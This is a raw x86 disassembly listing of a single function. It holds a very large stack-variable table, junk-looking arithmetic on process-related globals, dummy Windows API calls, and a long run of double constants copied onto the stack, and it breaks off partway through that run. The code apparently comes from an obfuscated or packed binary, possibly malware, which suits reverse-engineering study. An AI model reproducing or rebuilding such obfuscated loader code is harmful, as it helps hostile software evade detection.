var_10B8	= qword	ptr -10B8h
var_10B0	= qword	ptr -10B0h
var_10A8	= qword	ptr -10A8h
var_10A0	= qword	ptr -10A0h
var_1098	= qword	ptr -1098h
var_1090	= qword	ptr -1090h
var_1088	= qword	ptr -1088h
var_1080	= qword	ptr -1080h
var_1078	= qword	ptr -1078h
var_1070	= qword	ptr -1070h
var_1068	= qword	ptr -1068h
var_1060	= qword	ptr -1060h
var_1058	= qword	ptr -1058h
var_1050	= qword	ptr -1050h
var_1048	= qword	ptr -1048h
var_1040	= qword	ptr -1040h
var_1038	= qword	ptr -1038h
var_1030	= qword	ptr -1030h
var_1028	= qword	ptr -1028h
var_1020	= qword	ptr -1020h
var_1018	= qword	ptr -1018h
var_1010	= qword	ptr -1010h
var_1008	= qword	ptr -1008h
var_1000	= qword	ptr -1000h
var_FF8		= qword	ptr -0FF8h
var_FF0		= qword	ptr -0FF0h
var_FE8		= qword	ptr -0FE8h
var_FE0		= qword	ptr -0FE0h
var_FD8		= qword	ptr -0FD8h
var_FD0		= qword	ptr -0FD0h
var_FC8		= qword	ptr -0FC8h
var_FC0		= qword	ptr -0FC0h
var_FB8		= qword	ptr -0FB8h
var_FB0		= qword	ptr -0FB0h
var_FA8		= qword	ptr -0FA8h
var_FA0		= qword	ptr -0FA0h
var_F98		= qword	ptr -0F98h
var_F90		= qword	ptr -0F90h
var_F88		= qword	ptr -0F88h
var_F80		= qword	ptr -0F80h
var_F78		= qword	ptr -0F78h
var_F70		= qword	ptr -0F70h
var_F68		= qword	ptr -0F68h
var_F60		= qword	ptr -0F60h
var_F58		= qword	ptr -0F58h
var_F50		= qword	ptr -0F50h
var_F48		= qword	ptr -0F48h
var_F40		= qword	ptr -0F40h
var_F38		= qword	ptr -0F38h
var_F30		= qword	ptr -0F30h
var_F28		= qword	ptr -0F28h
var_F20		= qword	ptr -0F20h
var_F18		= qword	ptr -0F18h
var_F10		= qword	ptr -0F10h
var_F08		= qword	ptr -0F08h
var_F00		= qword	ptr -0F00h
var_EF8		= qword	ptr -0EF8h
var_EF0		= qword	ptr -0EF0h
var_EE8		= qword	ptr -0EE8h
var_EE0		= qword	ptr -0EE0h
var_ED8		= qword	ptr -0ED8h
var_ED0		= qword	ptr -0ED0h
var_EC8		= qword	ptr -0EC8h
var_EC0		= qword	ptr -0EC0h
var_EB8		= qword	ptr -0EB8h
var_EB0		= qword	ptr -0EB0h
var_EA8		= qword	ptr -0EA8h
var_EA0		= qword	ptr -0EA0h
var_E98		= qword	ptr -0E98h
var_E90		= qword	ptr -0E90h
var_E88		= qword	ptr -0E88h
var_E80		= qword	ptr -0E80h
var_E78		= qword	ptr -0E78h
var_E70		= qword	ptr -0E70h
var_E68		= qword	ptr -0E68h
var_E60		= qword	ptr -0E60h
var_E58		= qword	ptr -0E58h
var_E50		= qword	ptr -0E50h
var_E48		= qword	ptr -0E48h
var_E40		= qword	ptr -0E40h
var_E38		= qword	ptr -0E38h
var_E30		= qword	ptr -0E30h
var_E28		= qword	ptr -0E28h
var_E20		= qword	ptr -0E20h
var_E18		= qword	ptr -0E18h
var_E10		= qword	ptr -0E10h
var_E08		= qword	ptr -0E08h
var_E00		= qword	ptr -0E00h
var_DF8		= qword	ptr -0DF8h
var_DF0		= qword	ptr -0DF0h
var_DE8		= qword	ptr -0DE8h
var_DE0		= qword	ptr -0DE0h
var_DD8		= qword	ptr -0DD8h
var_DD0		= qword	ptr -0DD0h
var_DC8		= qword	ptr -0DC8h
var_DC0		= qword	ptr -0DC0h
var_DB8		= qword	ptr -0DB8h
var_DB0		= qword	ptr -0DB0h
var_DA8		= qword	ptr -0DA8h
var_DA0		= qword	ptr -0DA0h
var_D98		= qword	ptr -0D98h
var_D90		= qword	ptr -0D90h
var_D88		= qword	ptr -0D88h
var_D80		= qword	ptr -0D80h
var_D78		= qword	ptr -0D78h
var_D70		= qword	ptr -0D70h
var_D68		= qword	ptr -0D68h
var_D60		= qword	ptr -0D60h
var_D58		= qword	ptr -0D58h
var_D50		= qword	ptr -0D50h
var_D48		= qword	ptr -0D48h
var_D40		= qword	ptr -0D40h
var_D38		= qword	ptr -0D38h
var_D30		= qword	ptr -0D30h
var_D28		= qword	ptr -0D28h
var_D20		= qword	ptr -0D20h
var_D18		= qword	ptr -0D18h
var_D10		= qword	ptr -0D10h
var_D08		= qword	ptr -0D08h
var_D00		= qword	ptr -0D00h
var_CF8		= qword	ptr -0CF8h
var_CF0		= qword	ptr -0CF0h
var_CE8		= qword	ptr -0CE8h
var_CE0		= qword	ptr -0CE0h
var_CD8		= qword	ptr -0CD8h
var_CD0		= qword	ptr -0CD0h
var_CC8		= qword	ptr -0CC8h
var_CC0		= qword	ptr -0CC0h
var_CB8		= qword	ptr -0CB8h
var_CB0		= qword	ptr -0CB0h
var_CA8		= qword	ptr -0CA8h
var_CA0		= qword	ptr -0CA0h
var_C98		= qword	ptr -0C98h
var_C90		= qword	ptr -0C90h
var_C88		= qword	ptr -0C88h
var_C80		= qword	ptr -0C80h
var_C78		= qword	ptr -0C78h
var_C70		= qword	ptr -0C70h
var_C68		= qword	ptr -0C68h
var_C60		= qword	ptr -0C60h
var_C58		= qword	ptr -0C58h
var_C50		= qword	ptr -0C50h
var_C48		= qword	ptr -0C48h
var_C40		= qword	ptr -0C40h
var_C38		= qword	ptr -0C38h
var_C30		= qword	ptr -0C30h
var_C28		= qword	ptr -0C28h
var_C20		= qword	ptr -0C20h
var_C18		= qword	ptr -0C18h
var_C10		= qword	ptr -0C10h
var_C08		= qword	ptr -0C08h
var_C00		= qword	ptr -0C00h
var_BF8		= qword	ptr -0BF8h
var_BF0		= qword	ptr -0BF0h
var_BE8		= qword	ptr -0BE8h
var_BE0		= qword	ptr -0BE0h
var_BD8		= qword	ptr -0BD8h
var_BD0		= qword	ptr -0BD0h
var_BC8		= qword	ptr -0BC8h
var_BC0		= qword	ptr -0BC0h
var_BB8		= qword	ptr -0BB8h
var_BB0		= qword	ptr -0BB0h
var_BA8		= qword	ptr -0BA8h
var_BA0		= qword	ptr -0BA0h
var_B98		= qword	ptr -0B98h
var_B90		= qword	ptr -0B90h
var_B88		= qword	ptr -0B88h
var_B80		= qword	ptr -0B80h
var_B78		= qword	ptr -0B78h
var_B70		= qword	ptr -0B70h
var_B68		= qword	ptr -0B68h
var_B60		= qword	ptr -0B60h
var_B58		= qword	ptr -0B58h
var_B50		= qword	ptr -0B50h
var_B48		= qword	ptr -0B48h
var_B40		= qword	ptr -0B40h
var_B38		= qword	ptr -0B38h
var_B30		= qword	ptr -0B30h
var_B28		= qword	ptr -0B28h
var_B20		= qword	ptr -0B20h
var_B18		= qword	ptr -0B18h
var_B10		= qword	ptr -0B10h
var_B08		= qword	ptr -0B08h
var_B00		= qword	ptr -0B00h
var_AF8		= qword	ptr -0AF8h
var_AF0		= qword	ptr -0AF0h
var_AE8		= qword	ptr -0AE8h
var_AE0		= qword	ptr -0AE0h
var_AD8		= qword	ptr -0AD8h
var_AD0		= qword	ptr -0AD0h
var_AC8		= qword	ptr -0AC8h
var_AC0		= qword	ptr -0AC0h
var_AB8		= qword	ptr -0AB8h
var_AB0		= qword	ptr -0AB0h
var_AA8		= qword	ptr -0AA8h
var_AA0		= qword	ptr -0AA0h
var_A98		= qword	ptr -0A98h
var_A90		= qword	ptr -0A90h
var_A88		= qword	ptr -0A88h
var_A80		= qword	ptr -0A80h
var_A78		= qword	ptr -0A78h
var_A70		= qword	ptr -0A70h
var_A68		= qword	ptr -0A68h
var_A60		= qword	ptr -0A60h
var_A58		= qword	ptr -0A58h
var_A50		= qword	ptr -0A50h
var_A48		= qword	ptr -0A48h
var_A40		= qword	ptr -0A40h
var_A38		= qword	ptr -0A38h
var_A30		= qword	ptr -0A30h
var_A28		= qword	ptr -0A28h
var_A20		= qword	ptr -0A20h
var_A18		= qword	ptr -0A18h
var_A10		= qword	ptr -0A10h
var_A08		= qword	ptr -0A08h
var_A00		= qword	ptr -0A00h
var_9F8		= qword	ptr -9F8h
var_9F0		= qword	ptr -9F0h
var_9E8		= qword	ptr -9E8h
var_9E0		= qword	ptr -9E0h
var_9D8		= qword	ptr -9D8h
var_9D0		= qword	ptr -9D0h
var_9C8		= qword	ptr -9C8h
var_9C0		= qword	ptr -9C0h
var_9B8		= qword	ptr -9B8h
var_9B0		= qword	ptr -9B0h
var_9A8		= qword	ptr -9A8h
var_9A0		= qword	ptr -9A0h
var_998		= qword	ptr -998h
var_990		= qword	ptr -990h
var_988		= qword	ptr -988h
var_980		= qword	ptr -980h
var_978		= qword	ptr -978h
var_970		= qword	ptr -970h
var_968		= qword	ptr -968h
var_960		= qword	ptr -960h
var_958		= qword	ptr -958h
var_950		= qword	ptr -950h
var_948		= qword	ptr -948h
var_940		= qword	ptr -940h
var_938		= qword	ptr -938h
var_930		= qword	ptr -930h
var_928		= qword	ptr -928h
var_920		= qword	ptr -920h
var_918		= qword	ptr -918h
var_910		= qword	ptr -910h
var_908		= qword	ptr -908h
var_900		= qword	ptr -900h
var_8F8		= qword	ptr -8F8h
var_8F0		= qword	ptr -8F0h
var_8E8		= qword	ptr -8E8h
var_8E0		= qword	ptr -8E0h
var_8D8		= qword	ptr -8D8h
var_8D0		= qword	ptr -8D0h
var_8C8		= qword	ptr -8C8h
var_8C0		= qword	ptr -8C0h
var_8B8		= qword	ptr -8B8h
var_8B0		= qword	ptr -8B0h
var_8A8		= qword	ptr -8A8h
var_8A0		= qword	ptr -8A0h
var_898		= qword	ptr -898h
var_890		= qword	ptr -890h
var_888		= qword	ptr -888h
var_880		= qword	ptr -880h
var_878		= qword	ptr -878h
var_870		= qword	ptr -870h
var_868		= qword	ptr -868h
var_860		= qword	ptr -860h
var_858		= qword	ptr -858h
var_850		= qword	ptr -850h
var_848		= qword	ptr -848h
var_840		= qword	ptr -840h
var_838		= qword	ptr -838h
var_830		= qword	ptr -830h
var_828		= qword	ptr -828h
var_820		= qword	ptr -820h
var_818		= qword	ptr -818h
var_810		= qword	ptr -810h
var_808		= qword	ptr -808h
var_800		= qword	ptr -800h
var_7F8		= qword	ptr -7F8h
var_7F0		= qword	ptr -7F0h
var_7E8		= qword	ptr -7E8h
var_7E0		= qword	ptr -7E0h
var_7D8		= qword	ptr -7D8h
var_7D0		= qword	ptr -7D0h
var_7C8		= qword	ptr -7C8h
var_7C0		= qword	ptr -7C0h
var_7B8		= qword	ptr -7B8h
var_7B0		= qword	ptr -7B0h
var_7A8		= qword	ptr -7A8h
var_7A0		= qword	ptr -7A0h
var_798		= qword	ptr -798h
var_790		= qword	ptr -790h
var_788		= qword	ptr -788h
var_780		= qword	ptr -780h
var_778		= qword	ptr -778h
var_770		= qword	ptr -770h
var_768		= qword	ptr -768h
var_760		= qword	ptr -760h
var_758		= qword	ptr -758h
var_750		= qword	ptr -750h
var_748		= qword	ptr -748h
var_740		= qword	ptr -740h
var_738		= qword	ptr -738h
var_730		= qword	ptr -730h
var_728		= qword	ptr -728h
var_720		= qword	ptr -720h
var_718		= qword	ptr -718h
var_710		= qword	ptr -710h
var_708		= qword	ptr -708h
var_700		= qword	ptr -700h
var_6F8		= qword	ptr -6F8h
var_6F0		= qword	ptr -6F0h
var_6E8		= qword	ptr -6E8h
var_6E0		= qword	ptr -6E0h
var_6D8		= qword	ptr -6D8h
var_6D0		= qword	ptr -6D0h
var_6C8		= qword	ptr -6C8h
var_6C0		= qword	ptr -6C0h
var_6B8		= qword	ptr -6B8h
var_6B0		= qword	ptr -6B0h
var_6A8		= qword	ptr -6A8h
var_6A0		= qword	ptr -6A0h
var_698		= qword	ptr -698h
var_690		= qword	ptr -690h
var_688		= qword	ptr -688h
var_680		= qword	ptr -680h
var_678		= qword	ptr -678h
var_670		= qword	ptr -670h
var_668		= qword	ptr -668h
var_660		= qword	ptr -660h
var_658		= qword	ptr -658h
var_650		= qword	ptr -650h
var_648		= qword	ptr -648h
var_640		= qword	ptr -640h
var_638		= qword	ptr -638h
var_630		= qword	ptr -630h
var_628		= qword	ptr -628h
var_620		= qword	ptr -620h
var_618		= qword	ptr -618h
var_610		= qword	ptr -610h
var_608		= qword	ptr -608h
var_600		= qword	ptr -600h
var_5F8		= qword	ptr -5F8h
var_5F0		= qword	ptr -5F0h
var_5E8		= qword	ptr -5E8h
var_5E0		= qword	ptr -5E0h
var_5D8		= qword	ptr -5D8h
var_5D0		= qword	ptr -5D0h
var_5C8		= qword	ptr -5C8h
var_5C0		= qword	ptr -5C0h
var_5B8		= qword	ptr -5B8h
var_5B0		= qword	ptr -5B0h
var_5A8		= qword	ptr -5A8h
var_5A0		= qword	ptr -5A0h
var_598		= qword	ptr -598h
var_590		= qword	ptr -590h
var_588		= qword	ptr -588h
var_580		= qword	ptr -580h
var_578		= qword	ptr -578h
var_570		= qword	ptr -570h
var_568		= qword	ptr -568h
var_560		= qword	ptr -560h
var_558		= qword	ptr -558h
var_550		= qword	ptr -550h
var_548		= qword	ptr -548h
var_540		= qword	ptr -540h
var_538		= qword	ptr -538h
var_530		= qword	ptr -530h
var_528		= qword	ptr -528h
var_520		= qword	ptr -520h
var_518		= qword	ptr -518h
var_510		= qword	ptr -510h
var_508		= qword	ptr -508h
var_500		= qword	ptr -500h
var_4F8		= qword	ptr -4F8h
var_4F0		= qword	ptr -4F0h
var_4E8		= qword	ptr -4E8h
var_4E0		= qword	ptr -4E0h
var_4D8		= qword	ptr -4D8h
var_4D0		= qword	ptr -4D0h
var_4C8		= qword	ptr -4C8h
var_4C0		= qword	ptr -4C0h
var_4B8		= qword	ptr -4B8h
var_4B0		= qword	ptr -4B0h
var_4A8		= qword	ptr -4A8h
var_4A0		= qword	ptr -4A0h
var_498		= qword	ptr -498h
var_490		= qword	ptr -490h
var_488		= qword	ptr -488h
var_480		= qword	ptr -480h
var_478		= qword	ptr -478h
var_470		= qword	ptr -470h
var_468		= qword	ptr -468h
var_460		= qword	ptr -460h
var_458		= qword	ptr -458h
var_450		= qword	ptr -450h
var_448		= qword	ptr -448h
var_440		= qword	ptr -440h
var_438		= qword	ptr -438h
var_430		= qword	ptr -430h
var_428		= qword	ptr -428h
var_420		= qword	ptr -420h
var_418		= qword	ptr -418h
var_410		= qword	ptr -410h
var_408		= qword	ptr -408h
var_400		= qword	ptr -400h
var_3F8		= qword	ptr -3F8h
var_3F0		= qword	ptr -3F0h
var_3E8		= qword	ptr -3E8h
var_3E0		= qword	ptr -3E0h
var_3D8		= qword	ptr -3D8h
var_3D0		= qword	ptr -3D0h
var_3C8		= qword	ptr -3C8h
var_3C0		= qword	ptr -3C0h
var_3B8		= qword	ptr -3B8h
var_3B0		= qword	ptr -3B0h
var_3A8		= qword	ptr -3A8h
var_3A0		= qword	ptr -3A0h
var_398		= qword	ptr -398h
var_390		= qword	ptr -390h
var_388		= qword	ptr -388h
var_380		= qword	ptr -380h
var_378		= qword	ptr -378h
var_370		= qword	ptr -370h
var_368		= qword	ptr -368h
var_360		= qword	ptr -360h
var_358		= qword	ptr -358h
var_350		= qword	ptr -350h
var_348		= qword	ptr -348h
var_340		= qword	ptr -340h
var_338		= qword	ptr -338h
var_330		= qword	ptr -330h
var_328		= qword	ptr -328h
var_320		= qword	ptr -320h
var_318		= qword	ptr -318h
var_310		= qword	ptr -310h
var_308		= qword	ptr -308h
var_300		= qword	ptr -300h
var_2F8		= qword	ptr -2F8h
var_2F0		= qword	ptr -2F0h
var_2E8		= qword	ptr -2E8h
var_2E0		= qword	ptr -2E0h
var_2D8		= qword	ptr -2D8h
var_2D0		= qword	ptr -2D0h
var_2C8		= qword	ptr -2C8h
var_2C0		= qword	ptr -2C0h
var_2B8		= qword	ptr -2B8h
var_2B0		= qword	ptr -2B0h
var_2A8		= qword	ptr -2A8h
var_2A0		= qword	ptr -2A0h
var_298		= qword	ptr -298h
var_290		= qword	ptr -290h
var_288		= qword	ptr -288h
var_280		= qword	ptr -280h
var_278		= qword	ptr -278h
var_270		= qword	ptr -270h
var_268		= qword	ptr -268h
var_260		= qword	ptr -260h
var_258		= qword	ptr -258h
var_250		= qword	ptr -250h
var_248		= qword	ptr -248h
var_240		= qword	ptr -240h
var_238		= qword	ptr -238h
var_230		= qword	ptr -230h
var_228		= qword	ptr -228h
var_220		= qword	ptr -220h
var_218		= qword	ptr -218h
var_210		= qword	ptr -210h
var_208		= qword	ptr -208h
var_200		= qword	ptr -200h
var_1F8		= qword	ptr -1F8h
var_1F0		= qword	ptr -1F0h
var_1E8		= qword	ptr -1E8h
var_1E0		= qword	ptr -1E0h
var_1D8		= qword	ptr -1D8h
var_1D0		= qword	ptr -1D0h
var_1C8		= qword	ptr -1C8h
var_1C0		= qword	ptr -1C0h
var_1B8		= qword	ptr -1B8h
var_1B0		= qword	ptr -1B0h
var_1A8		= qword	ptr -1A8h
var_1A0		= qword	ptr -1A0h
var_198		= qword	ptr -198h
var_190		= qword	ptr -190h
var_188		= qword	ptr -188h
var_180		= qword	ptr -180h
var_178		= qword	ptr -178h
var_170		= qword	ptr -170h
var_168		= qword	ptr -168h
var_160		= qword	ptr -160h
var_158		= qword	ptr -158h
var_150		= qword	ptr -150h
var_148		= qword	ptr -148h
var_140		= qword	ptr -140h
var_138		= qword	ptr -138h
var_130		= qword	ptr -130h
var_128		= qword	ptr -128h
var_120		= qword	ptr -120h
var_118		= qword	ptr -118h
var_110		= qword	ptr -110h
var_108		= qword	ptr -108h
var_100		= qword	ptr -100h
var_F8		= qword	ptr -0F8h
var_F0		= qword	ptr -0F0h
var_E8		= qword	ptr -0E8h
var_E0		= qword	ptr -0E0h
var_D8		= qword	ptr -0D8h
var_D0		= qword	ptr -0D0h
var_C8		= qword	ptr -0C8h
var_C0		= qword	ptr -0C0h
var_B8		= qword	ptr -0B8h
var_B0		= qword	ptr -0B0h
var_A8		= qword	ptr -0A8h
var_A0		= qword	ptr -0A0h
var_98		= dword	ptr -98h
var_91		= byte ptr -91h
var_90		= word ptr -90h
var_8C		= dword	ptr -8Ch
var_70		= dword	ptr -70h
var_60		= dword	ptr -60h
var_5C		= dword	ptr -5Ch
var_58		= dword	ptr -58h
var_48		= dword	ptr -48h
var_38		= dword	ptr -38h
var_20		= dword	ptr -20h
var_1A		= byte ptr -1Ah
var_19		= byte ptr -19h
var_18		= word ptr -18h
var_14		= word ptr -14h
var_10		= dword	ptr -10h
var_7		= byte ptr -7
var_6		= byte ptr -6
var_5		= byte ptr -5
arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		mov	eax, 2B1Ch
		call	__alloca_probe
		push	ebx
		push	esi
		mov	[ebp+var_2A18],	51h
		mov	eax, [ebp+var_29A4]
		mov	ecx, [ebp+var_2B10]
		lea	edx, [ecx+eax-19h]
		sub	edx, [ebp+var_2A68]
		xor	edx, [ebp+var_29A4]
		mov	[ebp+var_29C2],	dl
		mov	eax, [ebp+var_2B10]
		mov	[ebp+var_2984],	eax
		movzx	ecx, [ebp+var_18]
		mov	edx, [ebp+var_2984]
		sub	edx, ecx
		add	edx, 7Ah
		mov	[ebp+var_29D2],	dl
		mov	eax, lpExitCode
		sub	eax, hProcess
		movzx	ecx, [ebp+var_2968]
		lea	edx, [eax+ecx-4Dh]
		movzx	eax, [ebp+var_2994]
		sub	edx, eax
		mov	[ebp+var_91], dl
		mov	dword_42C024, 35h
		movzx	ecx, [ebp+var_19]
		xor	ecx, 1Dh
		mov	hProcess, ecx
		mov	edx, dword_42C024
		add	edx, 4Fh
		or	edx, 81h
		mov	[ebp+var_2B00],	dx
		movzx	eax, [ebp+var_2968]
		mov	ecx, 29h
		sub	ecx, eax
		mov	hdc, ecx
		mov	[ebp+var_296C],	27h
		mov	[ebp+var_48], 2Fh
		mov	edx, [ebp+var_2B10]
		mov	eax, [ebp+var_8C]
		lea	ecx, [eax+edx-19h]
		mov	[ebp+var_6], cl
		movzx	edx, [ebp+var_2A50]
		movzx	eax, [ebp+var_2A50]
		add	edx, eax
		movzx	ecx, [ebp+var_299D]
		sub	edx, ecx
		and	edx, 1Ah
		mov	[ebp+var_2A60],	dx
		movzx	edx, word ptr [ebp+var_2B10]
		mov	[ebp+var_2A68],	edx
		mov	[ebp+var_2AB8],	11h
		mov	eax, [ebp+var_2A54]
		mov	[ebp+var_2B1C],	eax
		cmp	[ebp+var_2B1C],	0
		jz	short loc_402D83
		cmp	[ebp+var_2B1C],	1
		jz	short loc_402DAB
		jmp	loc_402E05
; ---------------------------------------------------------------------------

loc_402D83:				; CODE XREF: sub_402C40+133j
		mov	ecx, dword_42C044
		or	ecx, 2Bh
		mov	dword_42C044, ecx
		movzx	edx, [ebp+var_29C8]
		movzx	eax, [ebp+var_2998]
		and	eax, edx
		mov	[ebp+var_2998],	ax
		jmp	short loc_402E1E
; ---------------------------------------------------------------------------

loc_402DAB:				; CODE XREF: sub_402C40+13Cj
		movzx	ecx, [ebp+var_2AEC]
		movzx	edx, [ebp+var_2A50]
		add	ecx, edx
		xor	ecx, 4Ah
		movzx	eax, [ebp+var_2AF4]
		add	eax, ecx
		mov	[ebp+var_2AF4],	ax
		movzx	ecx, [ebp+var_29C8]
		sub	ecx, [ebp+var_2B10]
		add	ecx, dword_42C044
		mov	dword_42C044, ecx
		movzx	edx, [ebp+var_29C1]
		movzx	eax, [ebp+var_2A50]
		sub	edx, eax
		add	edx, dword_42C054
		mov	dword_42C054, edx
		jmp	short loc_402E1E
; ---------------------------------------------------------------------------

loc_402E05:				; CODE XREF: sub_402C40+13Ej
		mov	ecx, [ebp+var_2A68]
		add	ecx, 40h
		or	ecx, [ebp+var_2A80]
		or	ecx, 29h
		mov	[ebp+var_297C],	cx

loc_402E1E:				; CODE XREF: sub_402C40+169j
					; sub_402C40+1C3j
		mov	edx, [ebp+var_2A68]
		mov	[ebp+var_29A4],	edx
		mov	[ebp+var_58], 2Eh
		mov	[ebp+var_2A54],	51h
		mov	eax, 2Ah
		sub	eax, [ebp+var_296C]
		mov	[ebp+var_10], eax
		mov	[ebp+var_2B14],	0
		jmp	short loc_402E64
; ---------------------------------------------------------------------------

loc_402E55:				; CODE XREF: sub_402C40+2D8j
		mov	ecx, [ebp+var_2B14]
		add	ecx, 1
		mov	[ebp+var_2B14],	ecx

loc_402E64:				; CODE XREF: sub_402C40+213j
		cmp	[ebp+var_2B14],	0Ah
		jge	loc_402F1D
		movzx	edx, [ebp+var_18]
		add	edx, 4Fh
		mov	y, edx
		movzx	eax, [ebp+var_2A7C]
		add	eax, 51h
		or	eax, y
		mov	[ebp+var_98], eax
		mov	ecx, dword_42C024
		mov	dword_42C024, ecx
		mov	Wow64Process, 23h
		movzx	edx, [ebp+var_2A6C]
		add	edx, dword_42C024
		mov	[ebp+var_14], dx
		mov	[ebp+var_2A10],	1
		mov	dword_42C024, 0FFFFFFC3h
		movzx	eax, word ptr hProcess
		mov	hdc, eax
		mov	ecx, hdc
		push	ecx
		mov	edx, hdc
		push	edx
		mov	eax, lpExitCode
		push	eax
		mov	ecx, hProcess
		push	ecx
		mov	edx, dword_42C024
		push	edx
		call	sub_40E710
		add	esp, 14h
		sub	eax, 1Bh
		movzx	ecx, [ebp+var_1A]
		add	ecx, 39h
		and	eax, ecx
		mov	[ebp+var_2A50],	ax
		jmp	loc_402E55
; ---------------------------------------------------------------------------

loc_402F1D:				; CODE XREF: sub_402C40+22Bj
		movzx	edx, [ebp+var_299D]
		add	edx, dword_42C034
		mov	dword_42C034, edx
		push	3Ch		; ch
		call	ds:IsCharUpperA
		mov	esi, 23h
		sub	esi, eax
		sub	esi, 59h
		push	2Eh		; lpsize
		push	16h		; hbit
		call	ds:GetBitmapDimensionEx
		sub	esi, eax
		mov	[ebp+var_29D0],	si
		movzx	eax, [ebp+var_2988]
		or	eax, lpExitCode
		movzx	ecx, [ebp+var_29C8]
		add	ecx, eax
		mov	[ebp+var_29C8],	cx
		fld	ds:dbl_424C10
		fstp	[ebp+var_2958]
		fld	ds:dbl_424C08
		fstp	[ebp+var_2950]
		fld	ds:dbl_424C00
		fstp	[ebp+var_2948]
		fld	ds:dbl_424BF8
		fstp	[ebp+var_2940]
		fld	ds:dbl_424BF0
		fstp	[ebp+var_2938]
		fld	ds:dbl_424BE8
		fstp	[ebp+var_2930]
		fld	ds:dbl_424BE0
		fstp	[ebp+var_2928]
		fld	ds:dbl_424BD8
		fstp	[ebp+var_2920]
		fld	ds:dbl_424BD0
		fstp	[ebp+var_2918]
		fld	ds:dbl_424BC8
		fstp	[ebp+var_2910]
		fld	ds:dbl_424BC0
		fstp	[ebp+var_2908]
		fld	ds:dbl_424BB8
		fstp	[ebp+var_2900]
		fld	ds:dbl_424BB0
		fstp	[ebp+var_28F8]
		fld	ds:dbl_424BA8
		fstp	[ebp+var_28F0]
		fld	ds:dbl_424BD8
		fstp	[ebp+var_28E8]
		fld	ds:dbl_424BA0
		fstp	[ebp+var_28E0]
		fld	ds:dbl_424B98
		fstp	[ebp+var_28D8]
		fld	ds:dbl_424B90
		fstp	[ebp+var_28D0]
		fld	ds:dbl_424B88
		fstp	[ebp+var_28C8]
		fld	ds:dbl_424B80
		fstp	[ebp+var_28C0]
		fld	ds:dbl_424B78
		fstp	[ebp+var_28B8]
		fld	ds:dbl_424BB0
		fstp	[ebp+var_28B0]
		fld	ds:dbl_424B70
		fstp	[ebp+var_28A8]
		fld	ds:dbl_424B68
		fstp	[ebp+var_28A0]
		fld	ds:dbl_424B60
		fstp	[ebp+var_2898]
		fld	ds:dbl_424B58
		fstp	[ebp+var_2890]
		fld	ds:dbl_424B50
		fstp	[ebp+var_2888]
		fld	ds:dbl_424B48
		fstp	[ebp+var_2880]
		fld	ds:dbl_424B40
		fstp	[ebp+var_2878]
		fld	ds:dbl_424B38
		fstp	[ebp+var_2870]
		fld	ds:dbl_424B30
		fstp	[ebp+var_2868]
		fld	ds:dbl_424B28
		fstp	[ebp+var_2860]
		fld	ds:dbl_424B40
		fstp	[ebp+var_2858]
		fld	ds:dbl_424B20
		fstp	[ebp+var_2850]
		fld	ds:dbl_424B18
		fstp	[ebp+var_2848]
		fld	ds:dbl_424C10
		fstp	[ebp+var_2840]
		fld	ds:dbl_424B10
		fstp	[ebp+var_2838]
		fld	ds:dbl_424B08
		fstp	[ebp+var_2830]
		fld	ds:dbl_424B00
		fstp	[ebp+var_2828]
		fld	ds:dbl_424AF8
		fstp	[ebp+var_2820]
		fld	ds:dbl_424AF0
		fstp	[ebp+var_2818]
		fld	ds:dbl_424AE8
		fstp	[ebp+var_2810]
		fld	ds:dbl_424AE0
		fstp	[ebp+var_2808]
		fld	ds:dbl_424AD8
		fstp	[ebp+var_2800]
		fld	ds:dbl_424AD0
		fstp	[ebp+var_27F8]
		fld	ds:dbl_424AC8
		fstp	[ebp+var_27F0]
		fld	ds:dbl_424AD8
		fstp	[ebp+var_27E8]
		fld	ds:dbl_424AC0
		fstp	[ebp+var_27E0]
		fld	ds:dbl_424AB8
		fstp	[ebp+var_27D8]
		fld	ds:dbl_424AB0
		fstp	[ebp+var_27D0]
		fld	ds:dbl_424AA8
		fstp	[ebp+var_27C8]
		fld	ds:dbl_424AA0
		fstp	[ebp+var_27C0]
		fld	ds:dbl_424A98
		fstp	[ebp+var_27B8]
		fld	ds:dbl_424A90
		fstp	[ebp+var_27B0]
		fld	ds:dbl_424A88
		fstp	[ebp+var_27A8]
		fld	ds:dbl_424A80
		fstp	[ebp+var_27A0]
		fld	ds:dbl_424A78
		fstp	[ebp+var_2798]
		fld	ds:dbl_424A70
		fstp	[ebp+var_2790]
		fld	ds:dbl_424BE0
		fstp	[ebp+var_2788]
		fld	ds:dbl_424A68
		fstp	[ebp+var_2780]
		fld	ds:dbl_424A60
		fstp	[ebp+var_2778]
		fld	ds:dbl_424A58
		fstp	[ebp+var_2770]
		fld	ds:dbl_424A50
		fstp	[ebp+var_2768]
		fld	ds:dbl_424A48
		fstp	[ebp+var_2760]
		fld	ds:dbl_424A98
		fstp	[ebp+var_2758]
		fld	ds:dbl_424A40
		fstp	[ebp+var_2750]
		fld	ds:dbl_424B68
		fstp	[ebp+var_2748]
		fld	ds:dbl_424A38
		fstp	[ebp+var_2740]
		fld	ds:dbl_424A30
		fstp	[ebp+var_2738]
		fld	ds:dbl_424A28
		fstp	[ebp+var_2730]
		fld	ds:dbl_424A50
		fstp	[ebp+var_2728]
		fld	ds:dbl_424A20
		fstp	[ebp+var_2720]
		fld	ds:dbl_424A18
		fstp	[ebp+var_2718]
		fld	ds:dbl_424A10
		fstp	[ebp+var_2710]
		fld	ds:dbl_424A08
		fstp	[ebp+var_2708]
		fld	ds:dbl_424AD8
		fstp	[ebp+var_2700]
		fld	ds:dbl_424A00
		fstp	[ebp+var_26F8]
		fld	ds:dbl_4249F8
		fstp	[ebp+var_26F0]
		fld	ds:dbl_4249F0
		fstp	[ebp+var_26E8]
		fld	ds:dbl_424BD8
		fstp	[ebp+var_26E0]
		fld	ds:dbl_424AD0
		fstp	[ebp+var_26D8]
		fld	ds:dbl_4249E8
		fstp	[ebp+var_26D0]
		fld	ds:dbl_4249E0
		fstp	[ebp+var_26C8]
		fld	ds:dbl_424AF8
		fstp	[ebp+var_26C0]
		fld	ds:dbl_4249D8
		fstp	[ebp+var_26B8]
		fld	ds:dbl_424A08
		fstp	[ebp+var_26B0]
		fld	ds:dbl_4249D0
		fstp	[ebp+var_26A8]
		fld	ds:dbl_424B88
		fstp	[ebp+var_26A0]
		fld	ds:dbl_424AF8
		fstp	[ebp+var_2698]
		fld	ds:dbl_4249C8
		fstp	[ebp+var_2690]
		fld	ds:dbl_4249C0
		fstp	[ebp+var_2688]
		fld	ds:dbl_4249B8
		fstp	[ebp+var_2680]
		fld	ds:dbl_4249E0
		fstp	[ebp+var_2678]
		fld	ds:dbl_4249B0
		fstp	[ebp+var_2670]
		fld	ds:dbl_4249A8
